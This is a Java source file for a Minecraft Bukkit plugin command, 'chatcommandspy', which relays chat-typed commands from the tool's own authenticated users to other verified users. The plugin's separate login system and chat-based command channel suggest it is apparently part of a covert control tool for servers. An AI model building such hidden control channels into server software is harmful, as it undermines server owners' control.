package cc.americium.command.commands.admin;

import cc.americium.Authentication;
import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class ChatCommandSpy implements Command, Listener {
    private final static ArrayList<UUID> toggled = new ArrayList<>();
    private static Z_ _z;

    public static void consoleCommand(String message) throws IOException, InterruptedException {
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!_z.getAuth().isVerified(p.getName()) || !toggled.contains(p.getUniqueId())) {
                continue;
            }

            p.sendMessage(Colors.Prefix + Colors.Caution + "EXTERNAl-CONSOLE" + ChatColor.BLUE + " -> " + Colors.Caution + message);
        }
    }

    @Override
    public String[] getCommands() {
        return new String[]{"chatcommandspy", "ccs"};
    }

    @Override
    public String getDescription() {
        return "Shows you all commands authed users are running. " + Colors.Caution + "ADMIN ONLY!";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        if (!toggled.contains(executor.getUniqueId())) {
            toggled.add(executor.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Success + "You will now see all commands!");
            return;
        }

        toggled.remove(executor.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Failure + "You will no longer see all commands!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
        _z = z;
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void chatEvent(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        String playerName = e.getPlayer().getName();
        String message = e.getMessage();
        Authentication auth = _z.getAuth();

        if (!auth.isLoggedIn(playerName)) {
            return;
        }

        Command[] commands = _z.commands;
        if (_z.getAuth().isAdmin(playerName)) {
            commands = Utilities.getAdminCommands(_z);
        }

        boolean isCommand = false;

        for (Command c : commands) {
            for (String alias : c.getCommands()) {
                if (message.toLowerCase().startsWith(alias.toLowerCase())) {
                    isCommand = true;
                    break;
                }
            }
        }

        if (!isCommand) {
            return;
        }

        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!auth.isVerified(p.getName()) || !toggled.contains(p.getUniqueId())) {
                continue;
            }

            if (p.getName().equals(playerName)) {
                continue;
            }

            p.sendMessage(Colors.Prefix + Colors.Caution + playerName + ChatColor.BLUE + " -> " + Colors.Caution + message);
        }
    }
}
